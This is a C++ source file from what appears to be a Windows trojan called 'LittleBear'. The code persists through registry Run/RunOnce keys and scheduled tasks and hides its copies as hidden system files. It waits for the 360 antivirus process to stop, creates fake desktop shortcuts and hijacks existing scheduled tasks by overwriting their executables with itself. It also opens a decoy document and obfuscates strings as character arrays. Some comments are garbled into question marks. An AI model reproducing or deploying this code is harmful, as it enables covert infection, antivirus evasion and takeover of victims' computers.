#include "PublicVar.h"
#include "BootAutoRun.h"
#include <lmcons.h>
#include <io.h>
#include <lmat.h>
#include <LMErr.h>
#include "AntiVirusInfo.h"
#include "DesktopLinkFile.h"
#include "function/DeviceInformation.h"
#include "AntiVirusInfo.h"
#include "function/InstallApps.h"
#include "network/NetWorkdata.h"
#include "RegEditor.h"
#include "Config.h"
#include "initParams.h"
#include "PublicFunc.h"


int copybackCfgFiles(string srcpath, string dstpath) {

	int cnt = 0;
	if (srcpath.back() != '\\' && srcpath.back() != '/')
	{
		srcpath += "\\";
	}

	if (dstpath.back() != '\\' && dstpath.back() != '/')
	{
		dstpath += "\\";
	}

	WIN32_FIND_DATAA f = { 0 };
	int iret = 0;
	string findall = srcpath + "*.*";
	HANDLE h = lpFindFirstFileA((char*)findall.c_str(), &f);
	if (h == INVALID_HANDLE_VALUE)
	{
		return cnt;
	}

	do
	{
		if ( (f.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) &&(lstrcmpiA(f.cFileName, "test.dat") == 0
			|| lstrcmpiA(f.cFileName, "flag.dat") == 0 || lstrcmpiA(f.cFileName, "config.dat") == 0))
		{
			string srcfn = srcpath + f.cFileName;
			string dstfn = dstpath + f.cFileName;
			iret = lpCopyFileA((char*)srcfn.c_str(), (char*)dstfn.c_str(), 0);

			cnt++;
		}
	} while (lpFindNextFileA(h, &f));

	lpFindClose(h);
	return cnt;
}


DWORD __stdcall CheckTSZAndMakeReboot()
{
	char szKeyAutoRun[] = { 'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0 };
	char szValueAutoRun[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };
	unsigned char szKeyValue[MAX_PATH] = { 0 };
	int valuelen = MAX_PATH;
	DWORD dwRegAutoRunOK = QueryRegistryValue(HKEY_CURRENT_USER, szKeyAutoRun, szValueAutoRun, szKeyValue, &valuelen, iCpuBits);
	if (dwRegAutoRunOK == FALSE || strstr((char*)szKeyValue, szValueAutoRun) == FALSE)
	{
		while (TRUE)
		{
			char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
			b360Running = GetProcessIdByName(sz360Tray) /*| GetProcessIdByName("360sd.exe") | GetProcessIdByName("360rp.exe")*/;
			if (b360Running == FALSE)
			{
				WriteLittleBearLog("some numbers process is shutdown you can do something\r\n");
				if (iSystemVersion <= SYSTEM_VERSION_XP)
				{
					int iRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE, strPEResidence, iCpuBits);
					iRet = SetBootAutoRunInRegistryRun(HKEY_CURRENT_USER, strPEResidence, iCpuBits);
					if (iRet == 0)
					{
						WriteLittleBearLog("CheckNumberAndMakeReboot windows xp SetBootAutoRunInRegistryRun error\r\n");
					}
					else
					{
						WriteLittleBearLog("CheckNumberAndMakeReboot  windows xp SetBootAutoRunInRegistryRun ok\r\n");
					}
				}
				else
				{
					int iUacSafeLevel = 0;
					int iRet = CreateScheduleInCmd(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, 
						iUacSafeLevel, szSysDir, iSystemVersion,
						strComputerName, strUserName);
					iRet = SetBootAutoRunInRegistryRun(HKEY_CURRENT_USER, strPEResidence, iCpuBits);
					iRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE, strPEResidence, iCpuBits);
					WriteLittleBearLog("CheckNumberAndMakeReboot CreateScheduleInCmd and SetBootAutoRunInRegistryRun ok\r\n");
				}
				return TRUE;
			}
			lpSleep(HEARTBEAT_LOOP_DELAY);
		}
	}

	return FALSE;
}


//3????????????:
//?? ????????
//????????????????????????,????????????????????????c:\users\username\appdata\services,??????????????????
//??????????:
//1 ?????????????????? 
//2 ?????????????? 
//3 ????360(????????????????????,????????????????????????,??????????????,????360????????????????????) 
//4 ??????????????????????(??????????????????????????)

//?? ????????????????????????????
//????????????????????????????,????????????????????????????????????????????????????????????????????
//??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

//?? ??????????
//????????????????????????c:\users\appdata\username\services????
//??????????????????????????????????????????,????????????????????????????????


int SetBootAutoRun(char * szSysDir,char * strPEResidence,int b360Exist,int iSystemVersion)
{
	int iRet = 0;
	char szShowInfo[1024];

//	char szPeSuffixExe[] = {'e','x','e',0};
//	char szPeSuffixCom[] = {'c','o','m',0};
//	char szPeSuffixScr [] = {'s','c','r',0};
//	char szPeSuffixBat [] = {'b','a','t',0};
// 	char szPeSuffixBin[] = {'b','i','n',0};
// 	char szPeSuffixCpl[] = {'c','p','l',0};
// 	char szPeSuffixAcm[] = {'a','c','m',0};
// 	char szPeSuffixMsi[] = {'m','s','i',0};
// 	char szPeSuffixDrv[] = {'d','r','v',0};
// 	char szPeSuffixSys[] = {'s','y','s',0};
// 	char szPeSuffixDll[] = {'d','l','l',0};
// 	char szPeSuffixLnk [] = {'l','n','k',0};
//	char * szPeSuffix = szPeSuffixExe;

	char szCurrentPath[MAX_PATH] = {0};
	char szCurrentExePath[MAX_PATH] = {0};

	//GetModleFileName	??????????????????
	//GetModuleBaseName	????????????????????
	iRet = lpGetModuleFileNameA(0,szCurrentExePath,MAX_PATH);
	iRet = GetPathFromFullName(szCurrentExePath,szCurrentPath);
	//GetCurrentDirectoryA:current dir is not same to GetModuleFileNameA:exe running path

	char szExeName[MAX_PATH] = {0};
	iRet = GetNameFromFullName(szCurrentExePath,szExeName);
	//char szExeMainName[MAX_PATH] = { 0 };
	//iRet = GetMainNameFormName(szExeName,szExeMainName);
	lpwsprintfA(strPEResidence,"%s%s",strDataPath,szExeName);

	int iArgc = 0;
	wchar_t * *wszOldFilePath = lpCommandLineToArgvW(lpGetCommandLineW(),&iArgc);
	if ( (iArgc >= 2 /*&& lplstrcmpiA(szCurrentPath,szDstPath) == 0*/)  )
	{
		char szParam[MAX_PATH] = {0};
		iRet = lpWideCharToMultiByte(CP_ACP,0,wszOldFilePath[1],lplstrlenW(wszOldFilePath[1]),szParam,MAX_PATH,NULL,NULL);
		if (iArgc >= 3)
		{
			char szParam2[MAX_PATH] = { 0 };
			iRet = lpWideCharToMultiByte(CP_ACP, 0, wszOldFilePath[2], lplstrlenW(wszOldFilePath[2]), szParam2, MAX_PATH, NULL, NULL);
			lplstrcpyA(szParentProcName, szParam2);
		}

		if (lplstrcmpA(szParam,"MyComputer") == 0)
		{
			OpenMyComputer();
			WriteLittleBearLog("MyComputer start up program\r\n");
		}
		else if(lplstrcmpA(szParam,"Recycle") == 0){
			OpenRecycle();
			WriteLittleBearLog("Recycle start up program\r\n");
		}
		else if(lplstrcmpA(szParam,"IE") == 0)
		{
			//OpenIE();
			char szIEFilePath[] = {'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','I','n','t','e','r','n','e','t',' ',
				'E','x','p','l','o','r','e','r','\\','i','e','x','p','l','o','r','e','.','e','x','e',0};
			lplstrcpyA(szIEPath,szIEFilePath);
			szIEPath[0] = szSysDir[0];
			char szShellExxcuteAActionOpen[] = {'o','p','e','n',0};
			lpShellExecuteA(0,szShellExxcuteAActionOpen,szIEPath,0,0,SW_SHOWNORMAL);//shellexecute can run document,not only executable files
			//char szIEDstPath[MAX_PATH];
			//lpwsprintfA(szIEDstPath,"cmd /c \"%s\"",szIEPath);
			//iRet = lpWinExec(szIEDstPath,SW_SHOWNORMAL);
			WriteLittleBearLog("IE start up program\r\n");
		}
		else if (lplstrcmpA(szParam,"QQ") == 0)
		{
			if ((*strQQPath == FALSE))
			{
				iRet = GetApplicationInfo(TRUE);
			}
			
			char szQQPath[MAX_PATH];
			lplstrcpyA(szQQPath,strQQPath);
			char szQQSubPath[] = {'\\','B','i','n','\\','Q','Q','S','c','L','a','u','n','c','h','e','r','.','e','x','e',0};
			lplstrcatA(szQQPath,szQQSubPath);
			char szQQDstPath[MAX_PATH];
			lpwsprintfA(szQQDstPath,"\"%s\"",szQQPath);
			iRet = lpWinExec(szQQDstPath,SW_SHOWNORMAL);
			WriteLittleBearLog("QQ start up program\r\n");
		}
		else if (lplstrcmpA(szParam,"wechat") == 0)
		{
			if (*szWechatPath == FALSE)
			{
				iRet = GetApplicationInfo(TRUE);
			}
			 
			char szWechatTmpPath[MAX_PATH];
			lplstrcpyA(szWechatTmpPath,szWechatPath);
			char szWechatSubPath[] = {'\\','w','e','c','h','a','t','.','e','x','e',0};
			lplstrcatA(szWechatTmpPath,szWechatSubPath);
			char szWechatDstPath[MAX_PATH];
			lpwsprintfA(szWechatDstPath,"\"%s\"",szWechatTmpPath);
			iRet = lpWinExec(szWechatDstPath,SW_SHOWNORMAL);
			WriteLittleBearLog("wechat start up program\r\n");
		}
		else if (lplstrcmpA(szParam,"FIREFOX") == 0)
		{
			if (*szFireFoxPath == FALSE)
			{
				iRet = GetApplicationInfo(TRUE);
			}

			char sztmppath[MAX_PATH];
			lplstrcpyA(sztmppath,szFireFoxPath);
			lplstrcatA(sztmppath,"\\firefox.exe");
			char szFireFoxDstPath[MAX_PATH];
			lpwsprintfA(szFireFoxDstPath,"\"%s\"",sztmppath);
			iRet = lpWinExec(szFireFoxDstPath,SW_SHOWNORMAL);
			WriteLittleBearLog("firfox start up program\r\n");
		}
		else if (lplstrcmpA(szParam,"CHROME") == 0)
		{
			if (*szChromePath == FALSE)
			{
				iRet = GetApplicationInfo(TRUE);
			}
			
			char sztmppath[MAX_PATH];
			lplstrcpyA(sztmppath,szChromePath);
			lplstrcatA(sztmppath,"\\chrome.exe");
			char szChromeDstPath[MAX_PATH];
			lpwsprintfA(szChromeDstPath,"\"%s\"",sztmppath);
			iRet = lpWinExec(szChromeDstPath,SW_SHOWNORMAL);
			WriteLittleBearLog("chrome start up program\r\n");
		}
		else if (lplstrcmpA(szParam,"STARTFIRSTTIME") == 0)
		{
			iRet = ReleaseIcon(strDataPath,lpThisDll);

			char strLogFilePath[MAX_PATH] = {0};
			iRet = ModifyModuleFileName(strLogFilePath,LITTLEBEAR_LOG_FILE_NAME);
			iRet = lpSetFileAttributesA(strLogFilePath,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

			if (b360Exist )
			{
				int iRet = GetApplicationInfo(TRUE);
				iRet = LnkProc(strPEResidence,szSysDir,strUserName,strDataPath);
				WriteLittleBearLog("number is running,to make fake icon on desktop\r\n");
			}
			else
			{
				if (iSystemVersion <= SYSTEM_VERSION_XP)
				{
					iRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE,strPEResidence,iCpuBits);
					iRet = SetBootAutoRunInRegistryRun(HKEY_CURRENT_USER,strPEResidence,iCpuBits);
					if (iRet == 0)
					{
						WriteLittleBearLog("BootAutoRun windows xp SetBootAutoRunInRegistryRun error\r\n");
					}
					else
					{
						WriteLittleBearLog("BootAutoRun  windows xp SetBootAutoRunInRegistryRun ok\r\n");
					}

					char szDllName[MAX_DLL_COUNT][MAX_PATH] = {0};
					DWORD iDllCnt = 0;
					iRet = FindAndCopyFileIntoDstDir(strDataPath,szCurrentPath,szDllName,&iDllCnt);
					iRet = BackupProgram(strPEResidence,szDllName,iDllCnt,szSysDir,strUserName,strBakPEResidence);
					if (iRet == 0)
					{
						WriteLittleBearLog("BootAutoRun windows xp BackupProgram error\r\n");
					}
					else
					{
						WriteLittleBearLog("BootAutoRun BackupProgram ok\r\n");
					}
				}
				else
				{
					int iUacSafeLevel = 0;
					int iRet = CreateScheduleInCmd(SCHEDULE_RUN_MIN_INTERVAL,LITTLEBEARNAME,strPEResidence,iUacSafeLevel,szSysDir,iSystemVersion,
						strComputerName,strUserName);
					iRet = SetBootAutoRunInRegistryRun(HKEY_CURRENT_USER,strPEResidence,iCpuBits);
					iRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE, strPEResidence, iCpuBits);
				}
			}

			WriteLittleBearLog("Run first time from network download\r\n");
		}else if (strstr(szParam,"--type=gpu-process"))
		{
			copybackCfgFiles(szCurrentPath, strDataPath);
			lpwsprintfA(szShowInfo, "wechat boot up,param:%s\r\n", szParam);
			WriteLittleBearLog(szShowInfo);
		}
		else{
			lpwsprintfA(szShowInfo,"unrecognized boot up,param:%s\r\n", szParam);
			WriteLittleBearLog(szShowInfo);
		}
	}else if(lplstrcmpiA(szCurrentPath, strDataPath) != 0 )
	{
		char szexplorer[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
		if (strstr(szParentProcName,szexplorer))
		{
			char strShowFileName[MAX_PATH] = { 0 };
			char * pShowFileName = GetDocumentFileName(strShowFileName, szCurrentPath);
			if (pShowFileName)
			{
				char szShowContentCmd[MAX_PATH] = { 0 };
				lpwsprintfA(szShowContentCmd, "\"%s\"", strShowFileName);
				char szOpen[] = { 'o','p','e','n',0 };
				HINSTANCE hInst = lpShellExecuteA(0, szOpen, szShowContentCmd, 0, strDataPath, SW_NORMAL);
			}
		}

		char szDllName[MAX_DLL_COUNT][MAX_PATH] = {0};
		DWORD iDllCnt = 0;
		iRet = FindAndCopyFileIntoDstDir(strDataPath,szCurrentPath,szDllName,&iDllCnt);
		iRet = ReleaseIcon(strDataPath, lpThisDll);

		char strLogFilePath[MAX_PATH] = {0};
		iRet = ModifyModuleFileName(strLogFilePath,LITTLEBEAR_LOG_FILE_NAME);
		iRet = lpSetFileAttributesA(strLogFilePath,FILE_ATTRIBUTE_HIDDEN /*| FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM*/);

// 		if(iSystemVersion <= SYSTEM_VERSION_XP)	
// 		{
// 			iRet = EnableDebugPrivilege(lpGetCurrentProcess(),TRUE);
// 			if (iRet)
// 			{
// 				WriteLittleBearLog("EnableDebugPrivilege ok\r\n");
// 				iRet = SetRunAsAdmin();
// 			}
// 			else
// 			{
// 				WriteLittleBearLog("EnableDebugPrivilege error\r\n");
// 			}
// 		}
// 		else if(iIsUserAdmin)
// 		{
// 			iRet = SetRunAsAdmin();
// 		}

		iRet =  replaceTask();
		if (iRet == FALSE)
		{
			if (b360Exist)
			{
				iRet = GetApplicationInfo(TRUE);
				iRet = LnkProc(strPEResidence, szSysDir, strUserName, strDataPath);
				WriteLittleBearLog("number is running,to make fake icon on desktop\r\n");
			}
			else
			{
				if (iSystemVersion <= SYSTEM_VERSION_XP)
				{
					// 				char szXPStartupFileFormat[] = "C:\\Documents and Settings\\%s\\????????????\\????\\????\\";
					// 				szXPStartupFileFormat[0] = szSysDir[0];	//not first char but second
					// 				char szXPStartupFile[MAX_PATH];
					// 				lpwsprintfA(szXPStartupFile,szXPStartupFileFormat,strUserName);
					// 				char szXPStartupFileNames[MAX_DLL_COUNT][MAX_PATH] = {0};
					// 				DWORD dwXPCopyFilesCnt = 0;
					// 				iRet = CopyFileToDstDir(szXPStartupFile,szXPStartupFileNames,&dwXPCopyFilesCnt);
					// 
					// 				char szShowInfo[512];
					// 				lpwsprintfA(szShowInfo,"the startup folder is:%s\r\n",szXPStartupFile);
					// 				WriteLittleBearLog(szShowInfo);

					// 				iRet = lpCopyFileA(strPEResidence,szXPStartupFile,0);
					// 				if (iRet)
					// 				{
					// 					WriteLittleBearLog("copy file to startup folder ok\r\n");
					// 				}
					// 				else
					// 				{
					// 					WriteLittleBearLog("copy file to startup folder error\r\n");
					// 				}

					// 				iRet = CreateSchInCmdWinXP(SCHEDULE_TIME_INTERVAL,LittleBearTaskName,strPEResidence);
					// 				if(iRet == 0)
					// 				{
					// 					WriteLittleBearLog("BootAutoRun windows xp CreateSchInCmdWinXP error\r\n");
					// 				}

					//				ai.JobTime = 20 * 60 * 60 * 1000 + 5 * 60 * 1000; 
					// 				iRet = LittleBearaddJob(0,24);
					// 				if(iRet == 0)
					// 				{
					// 					WriteLittleBearLog("BootAutoRun windows xp LittleBearaddJob error\r\n");
					// 				}

					iRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE, strPEResidence, iCpuBits);
					iRet = SetBootAutoRunInRegistryRun(HKEY_CURRENT_USER, strPEResidence, iCpuBits);
					if (iRet == 0)
					{
						WriteLittleBearLog("BootAutoRun windows xp SetBootAutoRunInRegistryRun error\r\n");
					}
					else
					{
						WriteLittleBearLog("BootAutoRun  windows xp SetBootAutoRunInRegistryRun ok\r\n");
					}

					iRet = BackupProgram(strPEResidence, szDllName, iDllCnt, szSysDir, strUserName, strBakPEResidence);
					if (iRet == 0)
					{
						WriteLittleBearLog("BootAutoRun windows xp BackupProgram error\r\n");
					}
					else
					{
						WriteLittleBearLog("BootAutoRun BackupProgram ok\r\n");
					}
				}
				else
				{
					int iUacSafeLevel = 0;
					iRet = CreateScheduleInCmd(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, iUacSafeLevel, szSysDir, iSystemVersion,
						strComputerName, strUserName);
					iRet = SetBootAutoRunInRegistryRun(HKEY_CURRENT_USER, strPEResidence, iCpuBits);
					iRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE, strPEResidence, iCpuBits);
				}
			}
		}


		
#ifdef REBOOT_TO_FAKE_OTHERS
		if (gMutex)
		{
			lpReleaseMutex(gMutex);
			lpCloseHandle(gMutex);
		}
		char szCmd[MAX_PATH] = { 0 };
		lpwsprintfA(szCmd, "\"%s\"", strPEResidence);
		//char szopen[] = { 'o','p','e','n',0 };
		//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
		iRet = lpWinExec(szCmd, SW_HIDE);

		lpwsprintfA(szShowInfo, "explorer start up program first time,to restart program:%s for second time\r\n", strPEResidence);
		WriteLittleBearLog(szShowInfo);

		lpExitProcess(0);
		
#endif
	}else{
		WriteLittleBearLog("taskmanager or self start program\r\n");
	}

	BOOL exist = FALSE;
	gMutex = CheckInstanceExist(LITTLEBEAR_MUTEX_NAME, &exist);
	if (gMutex && exist )
	{
		lpReleaseMutex(gMutex);

		lpCloseHandle(gMutex);
		char szout[1024];

		wsprintfA(szout,"littlebear is already running,mutex:%x,exist:%x\r\n",gMutex,exist);
		WriteLittleBearLog(szout);

		lpExitProcess(0);
		return FALSE;
	}
	else {
		lpwsprintfA(szShowInfo, 
			"username:%s,computername:%s,UacEnable:%u,ConsentPromptBehaviorAdmin:%u,PromptOnSecureDesktop:%u,iIsUserAdmin:%u,iIsProcessAdmin:%u,iIsAdministrator:%u,ParentProcessName:%s\r\n", \
			strUserName, strComputerName, iEnableLUA, iConsentPromptBehaviorAdmin, 
			iPromptOnSecureDesktop, iIsUserAdmin, iIsProcessAdmin, iIsAdministrator, szParentProcName);
		WriteLittleBearLog(szShowInfo);
	}

	if (b360Exist)
	{
		HANDLE hThreadLnkProc = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)CheckTSZAndMakeReboot,0,0,0);
		lpCloseHandle(hThreadLnkProc);
	}

	return TRUE;
}



int replaceTask() {

	string oldtaskspath = string(strDataPath) + "oldtasks.txt";
	string querycmd = string("cmd /c SCHTASKS /FO list /V > ") + oldtaskspath;
	int iret = WinExec(querycmd.c_str(),SW_HIDE);

	Sleep(6000);

	HANDLE h = CreateFileA(oldtaskspath.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (h == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	int filesize = GetFileSize(h, 0);
	char * data = new char[filesize + 0x1000];

	DWORD readcnt = 0;
	iret = ReadFile(h, data, filesize, &readcnt, 0);
	CloseHandle(h);
	//DeleteFileA(oldtaskspath.c_str());
	if (readcnt <= 0 || filesize != readcnt)
	{
		return FALSE;
	}
	
	*(data + filesize) = 0;

	char * hdrflag = "????????????:";
	int hdrflaglen = lstrlenA(hdrflag);

	char * hdr = data;
	do 
	{

		char * cmdline = strstr(hdr, hdrflag);
		if (cmdline <= 0)
		{
			delete data;
			break;
		}

		cmdline += hdrflaglen;

		hdr = cmdline;

		char tmpfilepath[MAX_PATH] = { 0 };
		int srcoffset = 0;
		int dstoffset = 0;
		while (1)
		{
			if (cmdline[srcoffset] == 0x0d || cmdline[srcoffset +1] == 0x0a)
			{
				break;
			}

			tmpfilepath[dstoffset] = cmdline[srcoffset];
			dstoffset++;

			srcoffset++;
		}

		delete data;

		string str = tmpfilepath;

		string::size_type pos = str.find_first_not_of(' ');
		if (pos != string::npos)
		{
			string::size_type pos2 = str.find_last_not_of(' ');
			if (pos2 != string::npos)
			{
				str = str.substr(pos, pos2 - pos + 1);
			}
		}

		pos = str.find_first_not_of('"');	//0x22
		if (pos != string::npos)
		{
			string::size_type pos2 = str.find_last_not_of('"');
			if (pos2 != string::npos)
			{
				str = str.substr(pos, pos2 - pos + 1);
			}
		}

		pos = str.find(" /");
		if (pos != string::npos)
		{
			str = str.substr(0, pos);
		}

		//char szfilename[MAX_PATH] = { 0 };
		//GetNameFromFullName((char*)str.c_str(), szfilename);
		char szcurexe[MAX_PATH] = { 0 };
		iret = GetModuleFileNameA(0, szcurexe, MAX_PATH);
		iret = CopyFileA(szcurexe, str.c_str(), 0);

		char szpath[MAX_PATH] = { 0 };
		iret = GetPathFromFullName((char*)str.c_str(), szpath);
		if (strstr(szpath,"system32") == 0 && strstr(szpath,"%windir%")==0 && strstr(szpath,"windows") == 0 && strstr(szpath,"SysWOW64") == 0)
		{
			char szdllname[MAX_DLL_COUNT][MAX_PATH];
			DWORD dllcnt = 0;
			iret = FindAndCopyFileIntoDstDir(szpath, strDataPath, szdllname, &dllcnt);

			return TRUE;
		}

	} while (TRUE);

	return FALSE;
}



DWORD BackupProgram(char * szSrcFile,char szDllName[MAX_DLL_COUNT][MAX_PATH],DWORD dwDllCnt,
	char * szSysDir,char * strUserName,char * strBakPEResidence)
{
	char szShowInfo[1024];

	char szPeSuffixExe[] = {'e','x','e',0};
	char szPeSuffixCom[] = {'c','o','m',0};
	char szPeSuffixScr [] = {'s','c','r',0};
	char szPeSuffixLnk [] = {'l','n','k',0};
	char szPeSuffixBat [] = {'b','a','t',0};
	int iRet = 0;

	char szDstExeNameFormatWin7[] = {'c',':','\\','u','s','e','r','s','\\','%','s','\\','D','o','c','u','m','e','n','t','s','\\','%','s',0};
	char szDstExeNameFormat[] ={'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
		0x5c,'%','s',0x5c,'M','y',' ','D','o','c','u','m','e','n','t','s',0x5c,'%','s',0};
	szDstExeNameFormatWin7[0] = szSysDir[0];
	szDstExeNameFormat[0] = szSysDir[0];
	char szDstFilePathFormat[MAX_PATH] = {0};
	if (iSystemVersion > SYSTEM_VERSION_XP)
	{
		lplstrcpyA(szDstFilePathFormat,szDstExeNameFormatWin7);
	}
	else
	{
		lplstrcpyA(szDstFilePathFormat,szDstExeNameFormat);
	}

	
	char szExeName[MAX_PATH] = {0};
	lplstrcpyA(szExeName,szSrcFile);
	pPathStripPathA(szExeName);

	char szDstExeName[MAX_PATH] = { 0 };
	lpwsprintfA(szDstExeName,szDstFilePathFormat,strUserName,szExeName);
	lplstrcpyA(strBakPEResidence,szDstExeName);

	//char szCurrentPath[MAX_PATH];
	//iRet = lpGetModuleFileNameA(0,szCurrentPath,MAX_PATH);
	iRet = lpCopyFileA(szSrcFile,szDstExeName,0);
	if (iRet == 0)
	{
		iRet = lpRtlGetLastWin32Error();
		
		lpwsprintfA(szShowInfo,"BackupProgram lpCopyFileA error,the src file is:%s,the dst file is:%s,the errorcode is:%u\r\n",
			szSrcFile,szDstExeName,iRet);
		WriteLittleBearLog(szShowInfo);
	}
	else
	{
		iRet = lpSetFileAttributesA(szDstExeName,FILE_ATTRIBUTE_HIDDEN | /*FILE_ATTRIBUTE_READONLY |*/ FILE_ATTRIBUTE_SYSTEM);
	}

	for (DWORD i = 0; i < dwDllCnt; i ++)
	{
		char szDstDllName[MAX_PATH] = {0};
		char szTmpDllName[MAX_PATH] = {0};
		lplstrcpyA(szTmpDllName,szDllName[i]);
		pPathStripPathA(szTmpDllName);
		lpwsprintfA(szDstDllName,szDstFilePathFormat,strUserName,szTmpDllName);
		iRet = lpCopyFileA(szDllName[i],szDstDllName,0);
		if (iRet == 0)
		{
			iRet = lpRtlGetLastWin32Error();
			lpwsprintfA(szShowInfo,"BackupProgram lpCopyFileA dll error,the src file is:%s,the dst file is:%s,the errorcode is:%u\r\n",
				szDllName[i],szDstDllName,iRet);
			WriteLittleBearLog(szShowInfo);
		}
		else
		{
			iRet = lpSetFileAttributesA(szDstDllName,FILE_ATTRIBUTE_HIDDEN | /*FILE_ATTRIBUTE_READONLY |*/ FILE_ATTRIBUTE_SYSTEM);

		}
	}

	//regqueryvalueex 2:Registry symbolic links should only be used for for application compatibility when absolutely necessary. 
	char szSubKey[] = {'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n','O','n','c','e',0x5c,0};
	char szKeyNameAutoRun[] = {'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0};	
	char szRegFullPath[MAX_PATH];
	char szRegFullPathFormat[] = {'%','s','\\','r','e','g','.','e','x','e',0};
	lpwsprintfA(szRegFullPath,szRegFullPathFormat,szSysDir);

	// 	lpwsprintfA(szParam,"query hkcu\\%s",szRegRunOnce);
	// 	iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam);

	//here as command schtasks /create command,do not user 2 "" to cover the command
	//not user " " to include the param in reg when execute it,it can not recognize it
	char szParam[MAX_PATH];
	char szParamFormat[]={'a','d','d',' ','h','k','c','u','\\','%','s',' ','/','v',' ','%','s',' ','/','t',' ','r','e','g','_','s','z',' ','/','d',' ','\"','%','s','\"',0};		
	//add hkcu\\%s /v %s /t reg_sz /d %s
	lpwsprintfA(szParam,szParamFormat,szSubKey,szKeyNameAutoRun,szDstExeName);
	char szCmd[MAX_PATH];
	char szCmdFormat[] = {'c','m','d',' ','/','c',' ','%','s',' ','%','s',0};
	lpwsprintfA(szCmd,szCmdFormat,szRegFullPath,szParam);
	unsigned char szKeyValue[MAX_PATH] = {0};
	int valuelen = MAX_PATH;
	iRet = QueryRegistryValue(HKEY_CURRENT_USER,szSubKey,szKeyNameAutoRun,szKeyValue,&valuelen,iCpuBits);
	if (iRet)
	{
		if (strstr((char*)szKeyValue,szDstExeName) == 0 )
		{
			iRet = lpWinExec(szCmd,SW_HIDE);
			//iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam,UACBYPASS_CMD_TYPE_RUNCMD);
		}else{

		}
	}
	else
	{
		iRet = lpWinExec(szCmd,SW_HIDE);
		//iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam,UACBYPASS_CMD_TYPE_RUNCMD);
	}

	lpwsprintfA(szShowInfo,"BackupProgram execute reg add command:%s\r\n",szCmd);
	WriteLittleBearLog(szShowInfo);

	return TRUE;
}











DWORD CreateSchInCmdWinXP(int iInterval,char * szTaskName,char * szPeFileName)
{
	char szShowInfo[1024];
	char szCmd[MAX_PATH];
	// 	char szScheduleCmd[] = {'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
	// 		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','s','y','s','t','e','m',0};

	char szScheduleCmd[] = {'c','m','d',' ','/','c',' ','%','s','\\',
		'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','%','s',0};

	char szAccountName[MAX_PATH];
	int iRet = lpwsprintfA(szAccountName,"%s\\%s",strComputerName,strUserName);
	//task account must be computer/user
	iRet = lpwsprintfA(szCmd,szScheduleCmd,szSysDir,iInterval,szTaskName,szPeFileName,szAccountName);

	iRet = lpWinExec(szCmd,SW_HIDE);
	if (iRet <= 31)
	{
		iRet = lpRtlGetLastWin32Error();
		char szShowInfo[512];
		lpwsprintfA(szShowInfo,"CreateScheduleInCmd lpWinExec create error,the errorcode is:%u\r\n",iRet);
		WriteLittleBearLog(szShowInfo);
		return FALSE;
	}

	//schtasks /change command need adin account and password,so here will be a failure result
	char szScheduleChange[] = {'c','m','d',' ','/','c',' ','%','s','\\','s','c','h','t','a','s','k','s',' ','/','c','h','a','n','g','e',' ',
		'/','t','n',' ','%','s',' ','/','r','l',' ','h','i','g','h','e','s','t',0};
	iRet = lpwsprintfA(szCmd,szScheduleChange,szSysDir,szTaskName);
	iRet = lpWinExec(szCmd,SW_HIDE);
	if (iRet <= 31)
	{
		iRet = lpRtlGetLastWin32Error();
		
		lpwsprintfA(szShowInfo,"CreateScheduleInCmd lpWinExec change error,the errorcode is:%u\r\n",iRet);
		WriteLittleBearLog(szShowInfo);
		return FALSE;
	}

	WriteLittleBearLog("windowxp create schedule ok\r\n");
	return TRUE;
}




//SCHTASKS /CREATE /SC MINUTE /MO 1 /TN ACCOUNTANT /TR CALC.EXE /ST 00:00 /ET 23:59 /SD 2017/02/14 /ED 2017/02/15

int CreateScheduleInCmd(int iInterval,char * szTaskName,char * szPeFileName,int iFlag,char * szSysDir,int iSystemVersion,
	char * strComputerName,char * strUserName)
{
	char szShowInfo[1024];
	// 	<Principals>\r\n\
	// 	<Principal id=\"Author\">\r\n\
	// 	<UserId>%s</UserId>\r\n\
